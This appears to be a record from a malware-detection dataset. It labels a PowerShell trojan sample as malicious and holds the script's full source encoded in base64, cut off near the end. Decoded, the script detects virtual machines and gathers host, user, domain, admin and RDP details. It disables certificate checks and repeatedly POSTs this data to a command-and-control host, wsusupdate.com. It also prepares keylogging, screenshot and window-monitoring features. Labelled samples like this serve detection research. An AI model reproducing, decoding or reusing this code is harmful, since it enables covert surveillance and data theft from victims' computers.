[@johnlatwc]_a_most_interesting_powershell_trojan.ps1,fc6e0c254e0d1766c486dbc5e0f18f35,Scan result is 32768. IsMalware: 1,I3NhbXBsZSBmb3VuZCBieSBASm9obkxhVHdjCiAgICAjJFdlYlBvc3RUaW1lciA9IDEyMDAKICAgICMkV2ViR2V0VGltZXIgPSAxMjAwCiAgICBbdm9pZF0gW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCJTeXN0ZW0uV2luZG93cy5Gb3JtcyIpICAgICAgICAgICAgCiAgICBbdm9pZF0gW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCJTeXN0ZW0uRHJhd2luZyIpICAgIAogICAgCiAgICBmdW5jdGlvbiBOZXctTXV0ZXgoJE11dGV4TmFtZSkgewogICAgCiAgICAjW0NtZGxldEJpbmRpbmcoKV1bT3V0cHV0VHlwZShbUFNPYmplY3RdKV0KICAgICNQYXJhbSAoW1BhcmFtZXRlcihNYW5kYXRvcnkpXVtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldW3N0cmluZ10kTXV0ZXhOYW1lKQogICAgJE11dGV4V2FzQ3JlYXRlZCA9ICRmYWxzZQogICAgJE11dGV4ID0gJE51bGwKICAgIFdyaXRlLVZlcmJvc2UgIldhaXRpbmcgdG8gYWNxdWlyZSBsb2NrIFskTXV0ZXhOYW1lXS4uLiIKICAgIFt2b2lkXVtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5UaHJlYWRpbmcnKQogICAgdHJ5IHsKICAgICAgICAkTXV0ZXggPSBbU3lzdGVtLlRocmVhZGluZy5NdXRleF06Ok9wZW5FeGlzdGluZygkTXV0ZXhOYW1lKQogICAgfSBjYXRjaCB7CiAgICAgICAgJE11dGV4ID0gTmV3LU9iamVjdCBTeXN0ZW0uVGhyZWFkaW5nLk11dGV4KCR0cnVlLCAkTXV0ZXhOYW1lLCBbcmVmXSRNdXRleFdhc0NyZWF0ZWQpCiAgICB9CiAgICB0cnkgeyBpZiAoISRNdXRleFdhc0NyZWF0ZWQpIHsgJE11dGV4LldhaXRPbmUoKSB8IE91dC1OdWxsIH0gfSBjYXRjaCB7IH0KICAgIFdyaXRlLVZlcmJvc2UgIkxvY2sgWyRNdXRleE5hbWVdIGFjcXVpcmVkLiBFeGVjdXRpbmcuLi4iCiAgICBXcml0ZS1PdXRwdXQgKFtQU0N1c3RvbU9iamVjdF1AeyBOYW1lID0gJE11dGV4TmFtZTsgTXV0ZXggPSAkTXV0ZXggfSkKfSAjIE5ldy1NdXRleApmdW5jdGlvbiBSZW1vdmUtTXV0ZXggewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgUmVtb3ZlcyBhIHByZXZpb3VzbHkgY3JlYXRlZCBNdXRleAogICAgLkRFU0NSSVBUSU9OCiAgICBUaGlzIGZ1bmN0aW9uIGF0dGVtcHRzIHRvIHJlbGVhc2UgYSBsb2NrIG9uIGEgbXV0ZXggY3JlYXRlZCBieSBhbiBlYXJsaWVyIGNhbGwKICAgIHRvIE5ldy1NdXRleC4KICAgIC5QQVJBTUVURVIgTXV0ZXhPYmplY3QKICAgIFRoZSBQU09iamVjdCBvYmplY3QgYXMgb3V0cHV0IGJ5IHRoZSBOZXctTXV0ZXggZnVuY3Rpb24uCiAgICAuSU5QVVRTCiAgICBOb25lLiBZb3UgY2Fubm90IHBpcGUgb2JqZWN0cyB0byB0aGlzIGZ1bmN0aW9uLgogICAgLk9VVFBVVFMKICAgIE5vbmUuCiAgICAjUmVxdWlyZXMgLVZlcnNpb24gMi4wCiAgICAjPgogICAgI1tDbWRsZXRCaW5kaW5nKCldCiAgICAjUGFyYW0gKFtQYXJhbWV0ZXIoTWFuZGF0b3J5KV1bVmFsaWRhdGVOb3ROdWxsKCldW1BTT2JqZWN0XSRNdXRleE9iamVjdCkKICAgICMgJE11dGV4T2JqZWN0IHwgZmwgKiB8IE91dC1TdHJpbmcgfCBXcml0ZS1Ib3N0CiAgICBXcml0ZS1WZXJib3NlICJSZWxlYXNpbmcgbG9jayBbJCgkTXV0ZXhPYmplY3QuTmFtZSldLi4uIgogICAgdHJ5IHsgW3ZvaWRdJE11dGV4T2JqZWN0Lk11dGV4LlJlbGVhc2VNdXRleCgpIH0gY2F0Y2ggeyB9Cn0gIyBSZW1vdmUtTXV0ZXgKCiAgICBuZXctbXV0ZXgoIkdsb2JhbFwkZW52OnVzZXJuYW1lJCgoR2V0LVByb2Nlc3MgLVBJRCAkcGlkKS5TZXNzaW9uSUQpIikKICAgIAogICAgRnVuY3Rpb24gR2V0LVN0cmluZ0hhc2goW1N0cmluZ10gJFN0cmluZywkSGFzaE5hbWUgPSAiTUQ1IikgCiAgICB7IAogICAgJFN0cmluZ0J1aWxkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgCiAgICBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtXTo6Q3JlYXRlKCRIYXNoTmFtZSkuQ29tcHV0ZUhhc2goW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkU3RyaW5nKSl8JXsgCiAgICBbVm9pZF0kU3RyaW5nQnVpbGRlci5BcHBlbmQoJF8uVG9TdHJpbmcoIngyIikpIAogICAgfSAKICAgICRTdHJpbmdCdWlsZGVyLlRvU3RyaW5nKCkgCiAgICB9CgogICAgRnVuY3Rpb24gSXNWaXJ0dWFsCiAgICB7CiAgICAgICAgICAgICAgICAkd21pYmlvcyA9IEdldC1XbWlPYmplY3QgV2luMzJfQklPUyAtRXJyb3JBY3Rpb24gU3RvcCB8IFNlbGVjdC1PYmplY3QgdmVyc2lvbixzZXJpYWxudW1iZXIgCiAgICAgICAgICAgICAgICAkd21pc3lzdGVtID0gR2V0LVdtaU9iamVjdCBXaW4zMl9Db21wdXRlclN5c3RlbSAtRXJyb3JBY3Rpb24gU3RvcCB8IFNlbGVjdC1PYmplY3QgbW9kZWwsbWFudWZhY3R1cmVyCiAgICAgICAgICAgICAgICAkUmVzdWx0UHJvcHMgPSBAewogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyTmFtZSA9ICRjb21wdXRlciAKICAgICAgICAgICAgICAgICAgICBCSU9TVmVyc2lvbiA9ICR3bWliaW9zLlZlcnNpb24gCiAgICAgICAgICAgICAgICAgICAgU2VyaWFsTnVtYmVyID0gJHdtaWJpb3Muc2VyaWFsbnVtYmVyIAogICAgICAgICAgICAgICAgICAgIE1hbnVmYWN0dXJlciA9ICR3bWlzeXN0ZW0ubWFudWZhY3R1cmVyIAogICAgICAgICAgICAgICAgICAgIE1vZGVsID0gJHdtaXN5c3RlbS5tb2RlbCAKICAgICAgICAgICAgICAgICAgICBJc1ZpcnR1YWwgPSAkZmFsc2UgCiAgICAgICAgICAgICAgICAgICAgVmlydHVhbFR5cGUgPSAkbnVsbCAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkd21pYmlvcy5TZXJpYWxOdW1iZXIgLWxpa2UgIipWTXdhcmUqIikgewogICAgICAgICAgICAgICAgICAgICRSZXN1bHRQcm9wcy5Jc1ZpcnR1YWwgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICRSZXN1bHRQcm9wcy5WaXJ0dWFsVHlwZSA9ICJWaXJ0dWFsIC0gVk1XYXJlIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgc3dpdGNoIC13aWxkY2FyZCAoJHdtaWJpb3MuVmVyc2lvbikgewogICAgICAgICAgICAgICAgICAgICAgICAnVklSVFVBTCcgeyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRQcm9wcy5Jc1ZpcnR1YWwgPSAkdHJ1ZSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRQcm9wcy5WaXJ0dWFsVHlwZSA9ICJWaXJ0dWFsIC0gSHlwZXItViIgCiAgICAgICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgICAgICdBIE0gSScgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFByb3BzLklzVmlydHVhbCA9ICR0cnVlIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFByb3BzLlZpcnR1YWxUeXBlID0gIlZpcnR1YWwgLSBWaXJ0dWFsIFBDIiAKICAgICAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAgICAgJypYZW4qJyB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFByb3BzLklzVmlydHVhbCA9ICR0cnVlIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFByb3BzLlZpcnR1YWxUeXBlID0gIlZpcnR1YWwgLSBYZW4iIAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKC1ub3QgJFJlc3VsdFByb3BzLklzVmlydHVhbCkgewogICAgICAgICAgICAgICAgICAgIGlmICgkd21pc3lzdGVtLm1hbnVmYWN0dXJlciAtbGlrZSAiKk1pY3Jvc29mdCoiKSAKICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0UHJvcHMuSXNWaXJ0dWFsID0gJHRydWUgCiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRQcm9wcy5WaXJ0dWFsVHlwZSA9ICJWaXJ0dWFsIC0gSHlwZXItViIgCiAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCR3bWlzeXN0ZW0ubWFudWZhY3R1cmVyIC1saWtlICIqVk1XYXJlKiIpIAogICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRQcm9wcy5Jc1ZpcnR1YWwgPSAkdHJ1ZSAKICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFByb3BzLlZpcnR1YWxUeXBlID0gIlZpcnR1YWwgLSBWTVdhcmUiIAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkd21pc3lzdGVtLm1vZGVsIC1saWtlICIqVmlydHVhbCoiKSB7IAogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0UHJvcHMuSXNWaXJ0dWFsID0gJHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFByb3BzLlZpcnR1YWxUeXBlID0gIlVua25vd24gVmlydHVhbCBNYWNoaW5lIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRyZXN1bHRzICs9IE5ldy1PYmplY3QgUHNPYmplY3QgLVByb3BlcnR5ICRSZXN1bHRQcm9wcwogICAgICAgICAgICAgICAgcmV0dXJuICRSZXN1bHRQcm9wcy5Jc1ZpcnR1YWwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgCiAgICBmdW5jdGlvbiBFc2NhcGUtSlNPTlN0cmluZygkc3RyKXsKCWlmICgkc3RyIC1lcSAkbnVsbCkge3JldHVybiAiIn0KCSRzdHIgPSAkc3RyLlRvU3RyaW5nKCkuUmVwbGFjZSgnIicsJ1wiJykuUmVwbGFjZSgnXCcsJ1xcJykuUmVwbGFjZSgiYG4iLCdcbicpLlJlcGxhY2UoImByIiwnXHInKS5SZXBsYWNlKCJgdCIsJ1x0JykKCXJldHVybiAkc3RyOwp9CgogICAgZnVuY3Rpb24gQ29udmVydFRvLUpTT04oJG1heERlcHRoID0gNCwkZm9yY2VBcnJheSA9ICRmYWxzZSkgewoJYmVnaW4gewoJCSRkYXRhID0gQCgpCgl9Cglwcm9jZXNzewoJCSRkYXRhICs9ICRfCgl9CgkKCWVuZHsKCQoJCWlmICgkZGF0YS5sZW5ndGggLWVxIDEgLWFuZCAkZm9yY2VBcnJheSAtZXEgJGZhbHNlKSB7CgkJCSR2YWx1ZSA9ICRkYXRhWzBdCgkJfSBlbHNlIHsJCgkJCSR2YWx1ZSA9ICRkYXRhCgkJfQoKCQlpZiAoJHZhbHVlIC1lcSAkbnVsbCkgewoJCQlyZXR1cm4gIm51bGwiCgkJfQoKCQkKCgkJJGRhdGFUeXBlID0gJHZhbHVlLkdldFR5cGUoKS5OYW1lCgkJCgkJc3dpdGNoIC1yZWdleCAoJGRhdGFUeXBlKSB7CgkgICAgICAgICAgICAnU3RyaW5nJyAgewoJCQkJCXJldHVybiAgImAiezB9YCIiIC1mIChFc2NhcGUtSlNPTlN0cmluZyAkdmFsdWUgKQoJCQkJfQoJICAgICAgICAgICAgJyhTeXN0ZW1cLik/RGF0ZVRpbWUnICB7cmV0dXJuICAiYCJ7MDp5eXl5LU1NLWRkfVR7MDpISDptbTpzc31gIiIgLWYgJHZhbHVlfQoJICAgICAgICAgICAgJ0ludDMyfERvdWJsZScge3JldHVybiAgIiR2YWx1ZSJ9CgkJCQknQm9vbGVhbicge3JldHVybiAgIiR2YWx1ZSIuVG9Mb3dlcigpfQoJICAgICAgICAgICAgJyhTeXN0ZW1cLik/T2JqZWN0XFtcXScgeyAjIGFycmF5CgkJCQkJCgkJCQkJaWYgKCRtYXhEZXB0aCAtbGUgMCl7cmV0dXJuICJgIiR2YWx1ZWAiIn0KCQkJCQkKCQkJCQkkanNvblJlc3VsdCA9ICcnCgkJCQkJZm9yZWFjaCgkZWxlbSBpbiAkdmFsdWUpewoJCQkJCQkjaWYgKCRlbGVtIC1lcSAkbnVsbCkge2NvbnRpbnVlfQoJCQkJCQlpZiAoJGpzb25SZXN1bHQuTGVuZ3RoIC1ndCAwKSB7JGpzb25SZXN1bHQgKz0nLCAnfQkJCQkKCQkJCQkJJGpzb25SZXN1bHQgKz0gKCRlbGVtIHwgQ29udmVydFRvLUpTT04gLW1heERlcHRoICgkbWF4RGVwdGggLTEpKQoJCQkJCX0KCQkJCQlyZXR1cm4gIlsiICsgJGpzb25SZXN1bHQgKyAiXSIKCSAgICAgICAgICAgIH0KCQkJCScoU3lzdGVtXC4pP0hhc2h0YWJsZScgeyAjIGhhc2h0YWJsZQoJCQkJCSRqc29uUmVzdWx0ID0gJycKCQkJCQlmb3JlYWNoKCRrZXkgaW4gJHZhbHVlLktleXMpewoJCQkJCQlpZiAoJGpzb25SZXN1bHQuTGVuZ3RoIC1ndCAwKSB7JGpzb25SZXN1bHQgKz0nLCAnfQoJCQkJCQkkanNvblJlc3VsdCArPSAKQCIKCSJ7MH0iOiB7MX0KIkAgLWYgJGtleSAsICgkdmFsdWVbJGtleV0gfCBDb252ZXJ0VG8tSlNPTiAtbWF4RGVwdGggKCRtYXhEZXB0aCAtMSkgKQoJCQkJCX0KCQkJCQlyZXR1cm4gInsiICsgJGpzb25SZXN1bHQgKyAifSIKCQkJCX0KCSAgICAgICAgICAgIGRlZmF1bHQgeyAjb2JqZWN0CgkJCQkJaWYgKCRtYXhEZXB0aCAtbGUgMCl7cmV0dXJuICAiYCJ7MH1gIiIgLWYgKEVzY2FwZS1KU09OU3RyaW5nICR2YWx1ZSl9CgkJCQkJCgkJCQkJcmV0dXJuICJ7IiArCgkJCQkJCSgoJHZhbHVlIHwgR2V0LU1lbWJlciAtTWVtYmVyVHlwZSAqcHJvcGVydHkgfCAlIHsgCkAiCgkiezB9IjogezF9CiJAIC1mICRfLk5hbWUgLCAoJHZhbHVlLigkXy5OYW1lKSB8IENvbnZlcnRUby1KU09OIC1tYXhEZXB0aCAoJG1heERlcHRoIC0xKSApCQkJCgkJCQkJCgkJCQkJfSkgLWpvaW4gJywgJykgKyAifSIKCSAgICAJCX0KCQl9Cgl9Cn0KCmZ1bmN0aW9uIEdldC1TeXN0ZW1VcHRpbWUgKCRjb21wdXRlciA9ICIkZW52OmNvbXB1dGVybmFtZSIpIHsKICAgICRsYXN0Ym9vdCA9IFtTeXN0ZW0uTWFuYWdlbWVudC5NYW5hZ2VtZW50RGF0ZVRpbWVjb252ZXJ0ZXJdOjpUb0RhdGVUaW1lKCIkKChnd21pICBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lKSIpCiAgICAkdXB0aW1lID0gKEdldC1EYXRlKSAtICRsYXN0Ym9vdAogICAgI1dyaXRlLUhvc3QgIlN5c3RlbSBVcHRpbWUgZm9yICRjb21wdXRlciBpczogIiAkdXB0aW1lLmRheXMgImRheXMiICR1cHRpbWUuaG91cnMgImhvdXJzIiAkdXB0aW1lLm1pbnV0ZXMgIm1pbnV0ZXMiICR1cHRpbWUuc2Vjb25kcyAic2Vjb25kcyIKICAgIHJldHVybiAoKCR1cHRpbWUuZGF5cykuVG9TdHJpbmcoKSsiZDoiKygkdXB0aW1lLmhvdXJzKS5Ub1N0cmluZygpKyJoOiIrJHVwdGltZS5taW51dGVzLlRvU3RyaW5nKCkrIm06IisoJHVwdGltZS5zZWNvbmRzKS5Ub1N0cmluZygpKyJzIikKfQkKCiAgICAgICAKICAgICRTY3JlZW5zID0gW3N5c3RlbS53aW5kb3dzLmZvcm1zLnNjcmVlbl06OkFsbFNjcmVlbnMgCiAgIAogICBmb3JlYWNoICgkU2NyZWVuIGluICRTY3JlZW5zKSB7ICAgICAgICAgICAgCiAgICAkRGV2aWNlTmFtZSA9ICRTY3JlZW4uRGV2aWNlTmFtZSAgICAgICAgICAgIAogICAgJFdpZHRoICA9ICRTY3JlZW4uQm91bmRzLldpZHRoICAgICAgICAgICAgCiAgICAkSGVpZ2h0ICA9ICRTY3JlZW4uQm91bmRzLkhlaWdodCAgICAgICAgICAgIAogICAgJElzUHJpbWFyeSA9ICRTY3JlZW4uUHJpbWFyeSAgICAgICAgICAgIAp9CiAgICAkU2NyZWVuc2hvdFBhdGggPSAiJGVudjp0ZW1wXDM5RjI4REQ5LTA2NzctNEVBQy05MUI4LTIxMTJCMTUxNTM0MSIKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFNjcmVlbnNob3RQYXRoKSkKICAgICAgICB7CiAgICAgICAgICAgIE5ldy1JdGVtICRTY3JlZW5zaG90UGF0aCAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZQogICAgICAgIH0KICAgICRyZXNvbHV0aW9uID0gJFdpZHRoLlRvU3RyaW5nKCkrIngiKyRIZWlnaHQuVG9TdHJpbmcoKQogICAgJHVzZXJuYW1lID0gIiRlbnY6dXNlcm5hbWUiLlRvTG93ZXIoKQogICAgJHVybCA9ICJodHRwczovL3dzdXN1cGRhdGUuY29tIgogICAgJGhhc2hpZCA9IEdldC1TdHJpbmdIYXNoKCQoR2V0LVdNSU9iamVjdCAtY2xhc3MgV2luMzJfRGlza0RyaXZlIHwgV2hlcmUtT2JqZWN0IHskXy5EZXZpY2VJRCAtZXEgIlxcLlxQSFlTSUNBTERSSVZFMCJ9KS5TZXJpYWxOdW1iZXIgKyBgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJChHZXQtV21pT2JqZWN0IC1jbGFzcyBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLlNlcmlhbE51bWJlciApCiAgICAkY3B1X25hbWUgPSAkKEdldC1XbWlPYmplY3QgLWNsYXNzICJXaW4zMl9Qcm9jZXNzb3IiIC1uYW1lc3BhY2UgInJvb3QvQ0lNVjIiKVswXS5uYW1lCiAgICBpZiAoJGNwdV9uYW1lIC1lcSAkbnVsbCkgeyAkY3B1X25hbWUgPSAkKEdldC1XbWlPYmplY3QgLWNsYXNzICJXaW4zMl9Qcm9jZXNzb3IiIC1uYW1lc3BhY2UgInJvb3QvQ0lNVjIiKS5uYW1lIH0KICAgICR2bSA9IElzVmlydHVhbAogICAgJHJhbSA9IChbTWF0aF06OlJvdW5kKChHZXQtV21pT2JqZWN0IC1DbGFzcyB3aW4zMl9jb21wdXRlcnN5c3RlbSkuVG90YWxQaHlzaWNhbE1lbW9yeS8xR2IpKS50b1N0cmluZygpCiAgICAkb3MgPSAoR2V0LVdtaU9iamVjdCAtY2xhc3MgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5DYXB0aW9uCiAgICAkb3NfYXJjaCA9IChHZXQtV21pT2JqZWN0IC1jbGFzcyBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLk9TQXJjaGl0ZWN0dXJlCiAgICAkdXB0aW1lID0gR2V0LVN5c3RlbVVwdGltZQogICAgIyRleHRfaXAgPSAoTmV3LU9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygiaHR0cDovL2NoZWNraXAuZHluZG5zLmNvbSIpIC1yZXBsYWNlICJbXlxkXC5dIgogICAgJGV4dF9pcCA9ICcnCiAgICAkdGltZXpvbmUgPSBbVGltZVpvbmVJbmZvXTo6TG9jYWwuQmFzZVV0Y09mZnNldC5Ib3VycwogICAgJElzQWRtaW4gPSAoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdICJBZG1pbmlzdHJhdG9yIikKICAgIGlmICgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyJykuZkRlbnlUU0Nvbm5lY3Rpb25zIC1lcSAxKSB7ICRyZHAgPSAkRmFsc2UgfQogICAgICAgIGVsc2UgeyAkcmRwID0gJFRydWUgfQogICAgaWYoJElzQWRtaW4gLW5lICRUcnVlKXsgCiAgICAgICAgaWYoICgkKHdob2FtaSAvZ3JvdXBzKSAtbGlrZSAiKlMtMS01LTMyLTU0NCoiKS5sZW5ndGggLWVxIDEgKSB7ICRJc0FkbWluICA9ICRUcnVlIH0KICAgIH0KCiAgICAjJHdhbl9zcGVlZCA9IE5ldy1PYmplY3QgbmV0LndlYmNsaWVudDsgInswOk4yfSBNYml0L3NlYyIgLWYgKCgxMDAvKE1lYXN1cmUtQ29tbWFuZCB7JHdjLkRvd25sb2FkZmlsZSgnaHR0cDovL2Vhc3QudGVzdG15Lm5ldC9kbC0xMDBNQicsImM6XHNwZWVkdGVzdC50ZXN0Iil9KS5Ub3RhbFNlY29uZHMpKjgpOyBkZWwgYzpcc3BlZWR0ZXN0LnRlc3QKCiAgICBpZiAoKGd3bWkgd2luMzJfY29tcHV0ZXJzeXN0ZW0pLnBhcnRvZmRvbWFpbiAtZXEgJHRydWUgLWFuZCAoZ3dtaSB3aW4zMl9jb21wdXRlcnN5c3RlbSkuZG9tYWluIC1uZSAiV09SS0dST1VQIikgewogICAgICAgICRkb21haW4gPSAoZ3dtaSB3aW4zMl9jb21wdXRlcnN5c3RlbSkuZG9tYWluLlRvVXBwZXIoKQogICAgICAgIH0KICAgIGVsc2UgeyRkb21haW4gPSAnbm9kb21haW4nfQogICAgJGxvZ19maWxlID0gIiRlbnY6dGVtcFxrZXkubG9nIgogICAgJHZlcnNpb24gPSAiMDRhIgoKJHBhcmFtcyA9IEB7InJlc29sdXRpb24iID0gIiRyZXNvbHV0aW9uIjsgInRpbWV6b25lIiA9ICIkdGltZXpvbmUiOyAidXB0aW1lIiA9ICIkdXB0aW1lIjsgImNvbXB1dGVyX25hbWUiID0gJGVudjpjb21wdXRlcm5hbWUuVG9VcHBlcigpOyAiaXNhZG1pbiIgPSAkaXNhZG1pbjsgInVzZXJuYW1lIiA9ICIkdXNlcm5hbWUiOyAiZG9tYWluIiA9ICIkZG9tYWluIjsgImNwdV9uYW1lIiA9ICIkY3B1X25hbWUiOyAidm0iID0gJHZtOyAicmFtIiA9ICIkcmFtIjsgYAogICAgICAgICAgICAiaGFzaGlkIiA9ICIkaGFzaGlkIjsgInVybCIgPSAiJHVybCI7ICJsb2dfZmlsZSIgPSAiJGxvZ19maWxlIjsgIlNjcmVlbnNob3RfcGF0aCIgPSAiJFNjcmVlbnNob3RQYXRoIjsgInZlcnNpb24iID0gIiR2ZXJzaW9uIjsgIm9zIiA9ICIkb3MiOyAib3NfYXJjaCIgPSAiJG9zX2FyY2giOyAicmRwIiA9ICIkcmRwIjsgImV4dF9pcCIgPSAiJGV4dF9pcCJ9CgoKCiRtID0gJHBhcmFtcyB8IENvbnZlcnRUby1qc29uCiRtCgoKZnVuY3Rpb24gSW52b2tlLVN0YXJ0IAogICAgICAgewogICAgICAgICAgICAkYnVmZmVyID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkbSkKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdICR3ZWJSZXF1ZXN0ID0gW1N5c3RlbS5OZXQuV2ViUmVxdWVzdF06OkNyZWF0ZSgkcGFyYW1zLnVybCsiL3N0YXJ0IikKICAgICAgICAgICAgICAgICAgICAjW1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdICR3ZWJSZXF1ZXN0ID0gW1N5c3RlbS5OZXQuV2ViUmVxdWVzdF06OkNyZWF0ZSgiaHR0cHM6Ly9kd2VmZndlZXcuY29tL3N0YXJ0IikKICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7ICR0cnVlIH0KICAgICAgICAgICAgICAgICAgICAkd2ViUmVxdWVzdC5Db250ZW50VHlwZSA9ICJhcHBsaWNhdGlvbi9qc29uIgogICAgICAgICAgICAgICAgICAgICR3ZWJSZXF1ZXN0LlRpbWVvdXQgPSAxMDAwMAogICAgICAgICAgICAgICAgICAgICR3ZWJSZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgogICAgICAgICAgICAgICAgICAgICR3ZWJSZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYnVmZmVyLkxlbmd0aDsKCgogICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtID0gJHdlYlJlcXVlc3QuR2V0UmVxdWVzdFN0cmVhbSgpCiAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uV3JpdGUoJGJ1ZmZlciwgMCwgJGJ1ZmZlci5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLkNsb3NlKCkKCiAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5OZXQuSHR0cFdlYlJlc3BvbnNlXSAkd2ViUmVzcG9uc2UgPSAkd2ViUmVxdWVzdC5HZXRSZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgJHN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcigkd2ViUmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHN0cmVhbVJlYWRlci5SZWFkVG9FbmQoKQogICAgICAgICAgICAgICAgICAgIHJldHVybiAkcmVzdWx0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgcmV0dXJuICRfLkV4Y2VwdGlvbi5NZXNzYWdlCiAgICAgICAgICAgICAgICB9CiAgICAgICB9CiAgICAgICAgICAKV2hpbGUgKCRUcnVlKSB7IAogICAgJHJlc3BvbnNlID0gSW52b2tlLVN0YXJ0CiAgICBpZiAoJHJlc3BvbnNlIC1lcSAnbnVsbCcpIHsKICAgICAgICBicmVhawogICAgICAgIH0KICAgICRyZXNwb25zZQogICAgU3RhcnQtU2xlZXAgLXMgMTIwMAogICAgY29udGludWUKICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAoKCmZ1bmN0aW9uIFRpdGxlLU1vbml0b3IKewpTdGFydC1Kb2IgLVNjcmlwdEJsb2NrIHsKQWRkLVR5cGUgQCIKICB1c2luZyBTeXN0ZW07CiAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwogIHB1YmxpYyBjbGFzcyBVc2VyV2luZG93cyB7CiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Rm9yZWdyb3VuZFdpbmRvdygpOwp9CiJAICAgICAKCiAgICAgICAgJGhhc2hpZCA9ICRhcmdzWzBdCiAgICAgICAgJHVybCA9ICRhcmdzWzFdCiAgICAgICAgJHVzZXJuYW1lID0gJGFyZ3NbMl0KICAgICAgICAkcmVzb2x1dGlvbiA9ICRhcmdzWzNdCiAgICAgICAgJFNjcmVlbnNob3RQYXRoID0gJGFyZ3NbNF0KCmZ1bmN0aW9uIEdldC1TY3JlZW5TaG90CnsKCgogJE91dFBhdGggPSAiJGVudjp0ZW1wXDM5RjI4REQ5LTA2NzctNEVBQy05MUI4LTIxMTJCMTUxNTM0MSIKICAgICAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5